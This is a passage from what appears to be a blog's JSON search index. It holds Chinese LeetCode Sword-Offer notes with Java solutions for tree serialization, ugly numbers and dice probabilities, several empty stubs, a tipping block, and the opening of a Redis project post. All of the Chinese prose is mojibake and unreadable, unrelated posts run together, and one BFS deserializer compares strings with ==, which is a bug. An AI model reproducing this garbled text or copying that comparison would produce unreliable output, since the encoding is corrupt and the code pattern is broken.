‘ç»“æ„ã€‚\n>\n>**æç¤ºï¼š**è¾“å…¥è¾“å‡ºæ ¼å¼ä¸ LeetCode ç›®å‰ä½¿ç”¨çš„æ–¹å¼ä¸€è‡´ï¼Œè¯¦æƒ…è¯·å‚é˜… [LeetCode åºåˆ—åŒ–äºŒå‰æ ‘çš„æ ¼å¼](https://support.leetcode-cn.com/hc/kb/article/1567641/)ã€‚ä½ å¹¶éå¿…é¡»é‡‡å–è¿™ç§æ–¹å¼ï¼Œä½ ä¹Ÿå¯ä»¥é‡‡ç”¨å…¶ä»–çš„æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n>\n>**ç¤ºä¾‹ï¼š**\n>\n>![](https://img.jwt1399.top/img/202209091241895.jpg)\n>\n>```\n>è¾“å…¥ï¼šroot = [1,2,3,null,null,4,5]\n>è¾“å‡ºï¼š[1,2,3,null,null,4,5]\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šDFS\n\n-   **åºåˆ—åŒ–**\n\n1.  é€’å½’çš„ç¬¬ä¸€æ­¥éƒ½æ˜¯ç‰¹ä¾‹çš„å¤„ç†ï¼Œå› ä¸ºè¿™æ˜¯é€’å½’çš„ä¸­æ­¢æ¡ä»¶ï¼šå¦‚æœæ ¹èŠ‚ç‚¹ä¸ºç©ºï¼Œè¿”å›â€nullâ€œ\n2.  åºåˆ—åŒ–çš„ç»“æœä¸ºï¼šæ ¹èŠ‚ç‚¹å€¼ + \",\" + å·¦å­èŠ‚ç‚¹å€¼(è¿›å…¥é€’å½’) + \",\" + å³å­èŠ‚ç‚¹å€¼(è¿›å…¥é€’å½’)\n3.  é€’å½’å°±æ˜¯ä¸æ–­å°†â€œæ ¹èŠ‚ç‚¹â€å€¼åŠ åˆ°ç»“æœä¸­çš„è¿‡ç¨‹\n\n-   **ååºåˆ—åŒ–**\n\n1.  å…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆé˜Ÿåˆ—\n2.  æ¥ä¸‹æ¥å°±è¿›å…¥äº†é€’å½’ \n    i. å¼¹å‡ºå·¦ä¾§å…ƒç´ ï¼Œå³é˜Ÿåˆ—å‡ºé˜Ÿ \n    ii. å¦‚æœå…ƒç´ ä¸ºâ€œnullâ€ï¼Œè¿”å›null\n    iii. å¦åˆ™ï¼Œæ–°å»ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œå…¶å€¼ä¸ºå¼¹å‡ºå…ƒç´  \n    iv. å…¶å·¦å­èŠ‚ç‚¹ä¸ºé˜Ÿåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œè¿›å…¥é€’å½’ï¼›å³å­èŠ‚ç‚¹ä¸ºé˜Ÿåˆ—çš„ä¸‹ä¸‹ä¸ªå…ƒç´ ï¼Œä¹Ÿè¿›å…¥é€’å½’ \n    v. é€’å½’å°±æ˜¯ä¸æ–­å°†å­æ ‘çš„æ ¹èŠ‚ç‚¹è¿æ¥åˆ°çˆ¶èŠ‚ç‚¹çš„è¿‡ç¨‹\n\n```java\npublic class Codec {\n  \n  // Encodes a tree to a single string.\n  public String serialize(TreeNode root) {\n      if(root == null) return \"null,\";\n      String res = root.val + \",\";\n      res += serialize(root.left);\n      res += serialize(root.right);\n      return res;\n  }\n\n  // Decodes your encoded data to tree.\n  public TreeNode deserialize(String data) {\n      String[] arr = data.split(\",\");\n      Queue<String> queue = new LinkedList<String>();\n      for(int i = 0; i < arr.length; i++){\n          queue.offer(arr[i]);\n      }\n      return dfs(queue);\n  }\n  public TreeNode dfs(Queue<String> queue){\n      String val = queue.poll();\n      if(val.equals(\"null\")) return null;\n      TreeNode root = new TreeNode(Integer.valueOf(val));\n      root.left = dfs(queue);\n      root.right = dfs(queue);\n      return root;\n  }\n}\n\n//ä¼˜åŒ–\npublic class Codec {\n\n    // Encodes a tree to a single string.\n    public String serialize(TreeNode root) {\n        if(root == null) return \"null\";\n        return root.val + \",\" + serialize(root.left) + \",\" + serialize(root.right);  \n    }\n\n    // Decodes your encoded data to tree.\n    public TreeNode deserialize(String data) {\n        Queue<String> queue = new LinkedList<>(Arrays.asList(data.split(\",\")));\n        return dfs(queue);\n    }\n\n    private TreeNode dfs(Queue<String> queue) {\n        String val = queue.poll();\n        if(\"null\".equals(val)) return null;\n        TreeNode root = new TreeNode(Integer.parseInt(val));\n        root.left = dfs(queue);\n        root.right = dfs(queue);\n        return root;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šBFS\n\n-   **åºåˆ—åŒ–**\n\n1.  ç”¨BFSéå†æ ‘ï¼Œä¸ä¸€èˆ¬éå†çš„ä¸åŒç‚¹æ˜¯ä¸ç®¡nodeçš„å·¦å³å­èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ï¼Œç»Ÿç»ŸåŠ åˆ°é˜Ÿåˆ—ä¸­\n2.  åœ¨èŠ‚ç‚¹å‡ºé˜Ÿæ—¶ï¼Œå¦‚æœèŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œåœ¨è¿”å›å€¼resä¸­åŠ å…¥ä¸€ä¸ª\"null\"ï¼›å¦‚æœèŠ‚ç‚¹å­˜åœ¨ï¼Œåˆ™åŠ å…¥èŠ‚ç‚¹å€¼çš„å­—ç¬¦ä¸²å½¢å¼\n\n-   **ååºåˆ—åŒ–**\n\n1.  åŒæ ·ä½¿ç”¨BFSæ–¹æ³•ï¼Œåˆ©ç”¨é˜Ÿåˆ—æ–°å»ºäºŒå‰æ ‘\n2.  é¦–å…ˆè¦å°†dataè½¬æ¢æˆåˆ—è¡¨ï¼Œç„¶åéå†ï¼Œåªè¦ä¸ä¸ºnullå°†èŠ‚ç‚¹æŒ‰é¡ºåºåŠ å…¥äºŒå‰æ ‘ä¸­ï¼›åŒæ—¶è¿˜è¦å°†èŠ‚ç‚¹å…¥é˜Ÿ\n3.  é˜Ÿåˆ—ä¸ºç©ºæ—¶éå†å®Œæ¯•ï¼Œè¿”å›æ ¹èŠ‚ç‚¹\n\n```java\npublic class Codec {\n\n    // Encodes a tree to a single string.\n    public String serialize(TreeNode root) {\n        if(root == null){\n            return \"[]\";\n        }\n        StringBuilder res = new StringBuilder();\n        res.append(\"[\");\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();\n            if (node != null){\n                res.append(node.val);\n                queue.offer(node.left);\n                queue.offer(node.right);\n            }else {\n                res.append(\"null\");\n            }\n            res.append(\",\");\n        }\n        res.append(\"]\");\n        return res.toString();\n    }\n\n    // Decodes your encoded data to tree.\n    public TreeNode deserialize(String data) {\n        if(data == \"[]\"){\n            return null;\n        }\n        String[] dataList = data.substring(1, data.length() - 1).split(\",\");\n        TreeNode root = new TreeNode(Integer.parseInt(dataList[0]));\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int i = 1;\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();\n            if(!dataList[i].equals(\"null\")){\n                node.left = new TreeNode(Integer.parseInt(dataList[i]));\n                queue.offer(node.left);\n            }\n            i++;\n            if(!dataList[i].equals(\"null\")){\n                node.right = new TreeNode(Integer.parseInt(dataList[i]));\n                queue.offer(node.right);\n            }\n            i++;\n        }\n        return root;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\næ–¹æ³•1\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n- ç©ºé—´å¤æ‚åº¦ï¼šO(n)\n\næ–¹æ³•2\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n- ç©ºé—´å¤æ‚åº¦ï¼šO(n)\n\n## 38. å­—ç¬¦ä¸²çš„æ’åˆ—\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„æ‰€æœ‰æ’åˆ—ã€‚\n>\n>ä½ å¯ä»¥ä»¥ä»»æ„é¡ºåºè¿”å›è¿™ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä½†é‡Œé¢ä¸èƒ½æœ‰é‡å¤å…ƒç´ ã€‚\n>\n>**ç¤ºä¾‹:**\n>\n>```\n>è¾“å…¥ï¼šs = \"abc\"\n>è¾“å‡ºï¼š[\"abc\",\"acb\",\"bac\",\"bca\",\"cab\",\"cba\"]\n>```\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n# ç¬¬ 29 å¤© åŠ¨æ€è§„åˆ’ï¼ˆå›°éš¾ï¼‰\n\n## 19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…\n\n### é¢˜ç›®\n\n>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åŒ¹é…åŒ…å«`'. '`å’Œ`'*'`çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚æ¨¡å¼ä¸­çš„å­—ç¬¦`'.'`è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ`'*'`è¡¨ç¤ºå®ƒå‰é¢çš„å­—ç¬¦å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ˆå«0æ¬¡ï¼‰ã€‚åœ¨æœ¬é¢˜ä¸­ï¼ŒåŒ¹é…æ˜¯æŒ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…æ•´ä¸ªæ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²`\"aaa\"`ä¸æ¨¡å¼`\"a.a\"`å’Œ`\"ab*ac*a\"`åŒ¹é…ï¼Œä½†ä¸`\"aa.a\"`å’Œ`\"ab*a\"`å‡ä¸åŒ¹é…ã€‚\n>\n>**ç¤ºä¾‹ 1:**\n>\n>```\n>è¾“å…¥:\n>s = \"aa\"\n>p = \"a\"\n>è¾“å‡º: false\n>è§£é‡Š: \"a\" æ— æ³•åŒ¹é… \"aa\" æ•´ä¸ªå­—ç¬¦ä¸²ã€‚\n>\n>```\n>\n>**ç¤ºä¾‹ 2:**\n>\n>```\n>è¾“å…¥:\n>s = \"aa\"\n>p = \"a*\"\n>è¾“å‡º: true\n>è§£é‡Š: å› ä¸º '*' ä»£è¡¨å¯ä»¥åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå‰é¢çš„é‚£ä¸€ä¸ªå…ƒç´ , åœ¨è¿™é‡Œå‰é¢çš„å…ƒç´ å°±æ˜¯ 'a'ã€‚å› æ­¤ï¼Œå­—ç¬¦ä¸² \"aa\" å¯è¢«è§†ä¸º 'a' é‡å¤äº†ä¸€æ¬¡ã€‚\n>\n>```\n>\n>**ç¤ºä¾‹ 3:**\n>\n>```\n>è¾“å…¥:\n>s = \"ab\"\n>p = \".*\"\n>è¾“å‡º: true\n>è§£é‡Š: \".*\" è¡¨ç¤ºå¯åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªï¼ˆ'*'ï¼‰ä»»æ„å­—ç¬¦ï¼ˆ'.'ï¼‰ã€‚\n>\n>```\n>\n>**ç¤ºä¾‹ 4:**\n>\n>```\n>è¾“å…¥:\n>s = \"aab\"\n>p = \"c*a*b\"\n>è¾“å‡º: true\n>è§£é‡Š: å› ä¸º '*' è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªï¼Œè¿™é‡Œ 'c' ä¸º 0 ä¸ª, 'a' è¢«é‡å¤ä¸€æ¬¡ã€‚å› æ­¤å¯ä»¥åŒ¹é…å­—ç¬¦ä¸² \"aab\"ã€‚\n>\n>```\n>\n>**ç¤ºä¾‹ 5:**\n>\n>```\n>è¾“å…¥:\n>s = \"mississippi\"\n>p = \"mis*is*p*.\"\n>è¾“å‡º: false\n>```\n>\n>-   `s` å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä» `a-z` çš„å°å†™å­—æ¯ã€‚\n>-   `p` å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä» `a-z` çš„å°å†™å­—æ¯ä»¥åŠå­—ç¬¦ `.` å’Œ `*`ï¼Œæ— è¿ç»­çš„ `'*'`ã€‚\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n## 49. ä¸‘æ•°\n\n### é¢˜ç›®\n\n>æˆ‘ä»¬æŠŠåªåŒ…å«è´¨å› å­ 2ã€3 å’Œ 5 çš„æ•°ç§°ä½œä¸‘æ•°ï¼ˆUgly Numberï¼‰ã€‚æ±‚æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºçš„ç¬¬ n ä¸ªä¸‘æ•°ã€‚\n>\n>ç¤ºä¾‹:\n>\n>```\n>è¾“å…¥: n = 10\n>è¾“å‡º: 12\n>è§£é‡Š: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 æ˜¯å‰ 10 ä¸ªä¸‘æ•°ã€‚\n>```\n\n### è§£ç­”\n\nä¸‘æ•°çš„é€’æ¨æ€§è´¨ï¼š ä¸‘æ•°åªåŒ…å«å› å­ 2, 3, 5 ï¼Œå› æ­¤æœ‰ â€œä¸‘æ•° == æŸè¾ƒå°ä¸‘æ•°Ã— 2/3/5â€ ã€‚\n\nè®¾å·²çŸ¥é•¿åº¦ä¸º n çš„ä¸‘æ•°åºåˆ— x<sub>1</sub>, x<sub>2</sub>, â‹¯â€‰, x<sub>n</sub> ï¼Œæ±‚ç¬¬ n+1 ä¸ªä¸‘æ•° x<sub>n+1</sub>ã€‚æ ¹æ ¹æ®é€’æ¨æ€§è´¨ï¼Œä¸‘æ•°  x<sub>n+1</sub> åªå¯èƒ½æ˜¯ä»¥ä¸‹ä¸‰ç§æƒ…å†µå…¶ä¸­ä¹‹ä¸€ï¼ˆç´¢å¼• a,b,c ä¸ºæœªçŸ¥æ•°ï¼‰ï¼š\n\n![](../images/LeetCode-å‰‘æŒ‡offer/image-20220913140851459.png)\n\n**ä¸‘æ•°é€’æ¨å…¬å¼ï¼š** è‹¥ç´¢å¼• a,b,c æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œåˆ™ä¸‹ä¸ªä¸‘æ•°  x<sub>n+1</sub> = minâ¡(x<sub>a</sub>Ã—2, x<sub>b</sub>Ã—3, x<sub>c</sub>Ã—5)\n\nå› æ­¤ï¼Œå¯è®¾ç½®æŒ‡é’ˆ a,b,c æŒ‡å‘é¦–ä¸ªä¸‘æ•°ï¼ˆå³ 1 ï¼‰ï¼Œå¾ªç¯æ ¹æ®é€’æ¨å…¬å¼å¾—åˆ°ä¸‹ä¸ªä¸‘æ•°ï¼Œå¹¶æ¯è½®å°†å¯¹åº”æŒ‡é’ˆæ‰§è¡Œ +1 å³å¯ã€‚\n\n##### åŠ¨æ€è§„åˆ’è§£æï¼š\n\n-   **çŠ¶æ€å®šä¹‰ï¼š** è®¾åŠ¨æ€è§„åˆ’åˆ—è¡¨ dp ï¼Œdp\\[i\\] ä»£è¡¨ç¬¬ i+1 ä¸ªä¸‘æ•°ï¼›\n-   **è½¬ç§»æ–¹ç¨‹ï¼š**\n    1.  å½“ç´¢å¼• a,b,c æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œ dp\\[i] ä¸ºä¸‰ç§æƒ…å†µçš„æœ€å°å€¼ï¼›\n    2.  æ¯è½®è®¡ç®— dp\\[i] = minâ¡(dp\\[a]Ã—2, dp\\[b]Ã—3, dp\\[c]Ã—5) åï¼Œéœ€è¦æ›´æ–°ç´¢å¼• a,b,c çš„å€¼ã€‚å®ç°æ–¹æ³•ï¼š**åˆ†åˆ«ç‹¬ç«‹åˆ¤æ–­** dp\\[i\\] å’Œ dp\\[a\\]Ã—2 , dp\\[b\\]Ã—3 , dp\\[c\\]Ã—5 çš„å¤§å°å…³ç³»ï¼Œè‹¥ç›¸ç­‰åˆ™å°†å¯¹åº”ç´¢å¼• a , b , c åŠ  1 ï¼›\n\n-   **åˆå§‹çŠ¶æ€ï¼š** dp\\[0\\]\\=1 ï¼Œå³ç¬¬ä¸€ä¸ªä¸‘æ•°ä¸º 1 ï¼›\n-   **è¿”å›å€¼ï¼š** dp\\[nâˆ’1\\]ï¼Œå³è¿”å›ç¬¬ n ä¸ªä¸‘æ•°ï¼›\n\n```java\nclass Solution {\n  public int nthUglyNumber(int n){\n    int a = 0, b = 0, c = 0;\n    int[] dp = new int[n];\n    dp[0] = 1;\n    for(int i = 1; i < n; i++){\n      int x = dp[a] * 2, y = dp[b] * 3, z = dp[c] * 5;\n      dp[i] = Math.min(Math.min(x,y),z);\n      if(dp[i] == x) a++;\n      if(dp[i] == y) b++;\n      if(dp[i] == z) c++;\n    }\n    return dp[n-1];\n  }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N\\=n ï¼ŒåŠ¨æ€è§„åˆ’éœ€éå†è®¡ç®— dp åˆ—è¡¨ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** é•¿åº¦ä¸º N çš„ dp åˆ—è¡¨ä½¿ç”¨ O(N) çš„é¢å¤–ç©ºé—´ã€‚\n\n## 60. nä¸ªéª°å­çš„ç‚¹æ•°\n\n### é¢˜ç›®\n\n>æŠŠnä¸ªéª°å­æ‰”åœ¨åœ°ä¸Šï¼Œæ‰€æœ‰éª°å­æœä¸Šä¸€é¢çš„ç‚¹æ•°ä¹‹å’Œä¸ºsã€‚è¾“å…¥nï¼Œæ‰“å°å‡ºsçš„æ‰€æœ‰å¯èƒ½çš„å€¼å‡ºç°çš„æ¦‚ç‡ã€‚\n>\n>ä½ éœ€è¦ç”¨ä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„è¿”å›ç­”æ¡ˆï¼Œå…¶ä¸­ç¬¬ i ä¸ªå…ƒç´ ä»£è¡¨è¿™ n ä¸ªéª°å­æ‰€èƒ½æ·å‡ºçš„ç‚¹æ•°é›†åˆä¸­ç¬¬ i å°çš„é‚£ä¸ªçš„æ¦‚ç‡ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: 1\n>è¾“å‡º: [0.16667,0.16667,0.16667,0.16667,0.16667,0.16667]\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: 2\n>è¾“å‡º: [0.02778,0.05556,0.08333,0.11111,0.13889,0.16667,0.13889,0.11111,0.08333,0.05556,0.02778]\n>```\n\n### è§£ç­”\n\nç°åœ¨æœ‰ `n` ä¸ªéª°å­ï¼Œç‚¹æ•°å’Œçš„èŒƒå›´ä¸º [n, 6n] ï¼Œé•¿åº¦ä¸º 6n - n + 1 = 5n + 1ï¼Œæ‰”å‡ºç‚¹æ•° `x` çš„æ¦‚ç‡æ˜¯å¤šå°‘ï¼Ÿ\n\né¦–å…ˆï¼Œ`1` ä¸ªéª°å­èƒ½æ‰”å‡ºçš„ç‚¹æ•°æ˜¯ `1~6`ï¼Œé‚£ä¹ˆ `n` ä¸ªéª°å­æ‰”å‡ºç‚¹æ•° `x` çš„æ¦‚ç‡å°±å¯ä»¥é€šè¿‡ `n-1` ä¸ªéª°å­æ‰”å‡ºç‚¹æ•° `x-1, x-2,... x-6` çš„æ¦‚ç‡åˆ†åˆ«ä¹˜ä»¥ 1/6 å†ç›¸åŠ å¾—åˆ°ã€‚\n\nå¦‚æœå®šä¹‰ä¸€ä¸ª `f(n, x)` å‡½æ•°è¡¨ç¤ºç”¨ n ä¸ªéª°å­æŠ›å‡º x ç‚¹æ•°çš„æ¦‚ç‡ï¼Œé‚£ä¹ˆè¿™ä¸ªçŠ¶æ€è½¬ç§»å…³ç³»å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202209151252298.png)\n\n`f(nâˆ’1,xâˆ’i)`ä¸­çš„ `xâˆ’i` ä¼šæœ‰è¶Šç•Œé—®é¢˜ã€‚ä¾‹å¦‚ï¼Œè‹¥å¸Œæœ›é€’æ¨è®¡ç®— `f(2,2)`ï¼Œç”±äºä¸€ä¸ªéª°å­çš„ç‚¹æ•°å’ŒèŒƒå›´ä¸º \\[1,6\\] ï¼Œå› æ­¤åªåº”æ±‚å’Œ f(1,1) ï¼Œå³ `f(1,0), f(1,âˆ’1), ..., f(1,âˆ’4)` çš†æ— æ„ä¹‰ã€‚å› æ­¤éœ€è¦ `xâˆ’i > 0` \n\n```java\n// è‡ªåº•å‘ä¸Šçš„è¿­ä»£è§£æ³•\nclass Solution {\n    public double[] dicesProbability(int n) {\n        // n ä¸ªéª°å­å¯èƒ½æ‰”å‡ºçš„ç»“æœçš„æœ€å¤§å€¼å’Œæœ€å°å€¼\n        int min = n, max = n * 6;\n        // å®šä¹‰ï¼šç”¨ n ä¸ªéª°å­ï¼Œå‡‘å‡º x çš„ç‚¹æ•°çš„æ¦‚ç‡æ˜¯ dp[n][x]\n        double[][] dp = new double[n + 1][max + 1];\n        // ä¸€ä¸ªéª°å­æ‰”å‡ºç‚¹æ•° 1~6 çš„æ¦‚ç‡æ˜¯ 1/6\n        for (int j = 1; j <= 6; j++) {\n            dp[1][j] = 1 / 6.0;\n        }\n        // çŠ¶æ€è½¬ç§»\n        for (int i = 2; i <= n; i++) {\n            for (int j = i * 1; j <= i * 6; j++) {\n                for (int k = 1; k <= 6; k++) {\n                    if (j - k <= 0) {\n                        break;\n                    }\n                    // i ä¸ªéª°å­æ‰”å‡ºç‚¹æ•° j çš„æ¦‚ç‡\n                    // å¯ä»¥é€šè¿‡ i - 1 ä¸ªéª°å­æ‰”å‡ºç‚¹æ•° j - k çš„æ¦‚ç‡æ¨å€’å‡ºæ¥\n                    dp[i][j] += dp[i - 1][j - k] * 1 / 6.0;\n                }\n            }\n        }\n        //ç‚¹æ•°å’Œçš„èŒƒå›´ä¸º [n, 6n] ï¼Œé•¿åº¦ä¸º 6n - n + 1 = 5n + 1\n        double[] res = new double[max - min + 1];\n        for (int i = 0; i < res.length; i++) {\n            res[i] = dp[n][min + i];\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(n<sup>2</sup>) ï¼š** çŠ¶æ€è½¬ç§»å¾ªç¯ nâˆ’1 è½®ï¼›æ¯è½®ä¸­ï¼Œå½“ i \\= 2,3,...,n æ—¶ï¼Œå¯¹åº”å¾ªç¯æ•°é‡åˆ†åˆ«ä¸º 6Ã—6,11Ã—6,...,\\(5n+1)Ã—6 ï¼›å› æ­¤æ€»ä½“å¤æ‚åº¦ä¸º O((nâˆ’1)Ã—{[6+(5n+1)]/2}Ã—6)ï¼Œå³ç­‰ä»·äºO(n<sup>2</sup>) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(n<sup>2</sup>)ï¼š**n*(5n+1)\n\n# ç¬¬ 30 å¤© åˆ†æ²»ç®—æ³•ï¼ˆå›°éš¾ï¼‰\n\n## 17. æ‰“å°ä»1åˆ°æœ€å¤§çš„nä½æ•°\n\n### é¢˜ç›®\n\n>è¾“å…¥æ•°å­— `n`ï¼ŒæŒ‰é¡ºåºæ‰“å°å‡ºä» 1 åˆ°æœ€å¤§çš„ n ä½åè¿›åˆ¶æ•°ã€‚æ¯”å¦‚è¾“å…¥ 3ï¼Œåˆ™æ‰“å°å‡º 1ã€2ã€3 ä¸€ç›´åˆ°æœ€å¤§çš„ 3 ä½æ•° 999ã€‚\n>\n>**ç¤ºä¾‹ 1:**\n>\n>```\n>è¾“å…¥: n = 1\n>è¾“å‡º: [1,2,3,4,5,6,7,8,9]\n>```\n>\n\n### è§£ç­”\n\nå¦‚æœä¸è€ƒè™‘å¤§æ•°é—®é¢˜ï¼Œæ‰¾å‡ºå³è¾¹ç•Œï¼Œç„¶åå¾ªç¯å³å¯ï¼ï¼\n\n```java\nclass Solution {\n    public int[] printNumbers(int n) {\n        int end = (int)Math.pow(10,n) - 1; \n        int[] res = new int[end];\n        for(int i = 0; i < end; i++){\n            res[i] = i + 1;\n        }\n        return res;\n    }\n}\n```\n\nè€ƒè™‘å¤§æ•°è¶Šç•Œæƒ…å†µ\n\nã€‚ã€‚ã€‚ã€‚\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(10<sup>n</sup>) ï¼š** ç”Ÿæˆé•¿åº¦ä¸º 10<sup>n</sup> çš„åˆ—è¡¨éœ€ä½¿ç”¨ O(10<sup>n</sup>) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å»ºç«‹åˆ—è¡¨éœ€ä½¿ç”¨ O(1) å¤§å°çš„é¢å¤–ç©ºé—´ï¼ˆ åˆ—è¡¨ä½œä¸ºè¿”å›ç»“æœï¼Œä¸è®¡å…¥é¢å¤–ç©ºé—´ ï¼‰ã€‚\n\n## 51. æ•°ç»„ä¸­çš„é€†åºå¯¹\n\n### é¢˜ç›®\n\n>\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n# ç¬¬ 31 å¤© æ•°å­¦ï¼ˆå›°éš¾ï¼‰\n\n## 14- II. å‰ªç»³å­ II\n\n### é¢˜ç›®\n\n>\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n## 43. 1ï½n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°\n\n### é¢˜ç›®\n\n>\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n## 44. æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—\n\n### é¢˜ç›®\n\n>\n\n### è§£ç­”\n\n\n\n```java\n\n```\n\n### å¤æ‚åº¦\n\n\n\n# â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ•°æ®ç»“æ„","ç®—æ³•"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"Redis-å®æˆ˜ç¯‡","url":"/posts/32967.html","content":"\n# â“ªç³»ç»Ÿç®€ä»‹\n\n1. **çŸ­ä¿¡ç™»å½•**ï¼šä½¿ç”¨Rediså…±äº«sessionæ¥å®ç°\n\n2. **å•†æˆ·æŸ¥è¯¢ç¼“å­˜**ï¼šç†è§£ç¼“å­˜å‡»ç©¿ï¼Œç¼“å­˜ç©¿é€ï¼Œç¼“å­˜é›ªå´©ç­‰é—®é¢˜\n\n3. **ä¼˜æƒ å·ç§’æ€**\n   - å­¦ä¼šRedisçš„è®¡æ•°å™¨åŠŸèƒ½ï¼Œ ç»“åˆLuaå®Œæˆé«˜æ€§èƒ½çš„redisæ“ä½œ\n   \n   - å­¦ä¼šRedisåˆ†å¸ƒå¼é”çš„åŸç†ï¼ŒåŒ…æ‹¬Redisçš„ä¸‰ç§æ¶ˆæ¯é˜Ÿåˆ—\n   \n4. **é™„è¿‘çš„å•†æˆ·**ï¼šåˆ©ç”¨Redisçš„GEOæ¥å®Œæˆå¯¹äºåœ°ç†åæ ‡çš„æ“ä½œ\n\n5. **UVç»Ÿè®¡**ï¼šä½¿ç”¨Redisçš„HyperLogLogæ¥å®Œæˆç»Ÿè®¡åŠŸèƒ½\n\n6. **ç”¨æˆ·ç­¾åˆ°**ï¼šä½¿ç”¨Redisçš„BitMapæ•°æ®ç»Ÿè®¡åŠŸèƒ½\n\n7. **å¥½å‹å…³æ³¨**ï¼šåŸºäºSeté›†åˆçš„å…³æ³¨ã€å–æ¶ˆå…³æ³¨ï¼Œå…±åŒå…³æ³¨ç­‰ç­‰åŠŸèƒ½\n\n8. **è¾¾äººæ¢åº—**ï¼šåŸºäºListå®Œæˆç‚¹èµåˆ—è¡¨çš„æ“ä½œï¼ŒåŸºäºSortedSetæ¥å®Œæˆç‚¹èµçš„æ’è¡Œæ¦œåŠŸèƒ½\n\n![](https://img.jwt1399.top/img/202210261714909.png)\n\n\n\n# â‘ çŸ­ä¿¡ç™»å½•\n\n## â¶åŸºäºsessionå®ç°ç™»å½•\n\n### 0.ç™»å½•æµç¨‹åˆ†æ\n\n![åŸºäºSessionå®ç°ç™»å½•æµç¨‹](https://img.jwt1399.top/img/202210121713673.png)\n\n**1.å‘é€çŸ­ä¿¡éªŒè¯ç ï¼š**\n\nç”¨æˆ·åœ¨æäº¤æ‰‹æœºå·åï¼Œä¼šæ ¡éªŒæ‰‹æœºå·æ˜¯å¦åˆæ³•ï¼Œ\n\n- å¦‚æœä¸åˆæ³•ï¼Œåˆ™è¦æ±‚ç”¨æˆ·é‡æ–°è¾“å…¥æ‰‹æœºå·\n\n- å¦‚æœåˆæ³•ï¼Œåå°ç”Ÿæˆå¯¹åº”çš„éªŒè¯ç ï¼ŒåŒæ—¶å°†éªŒè¯ç è¿›è¡Œä¿å­˜ï¼Œç„¶åå†é€šè¿‡çŸ­ä¿¡å°†éªŒè¯ç å‘é€ç»™ç”¨æˆ·\n\n**2.éªŒè¯ç 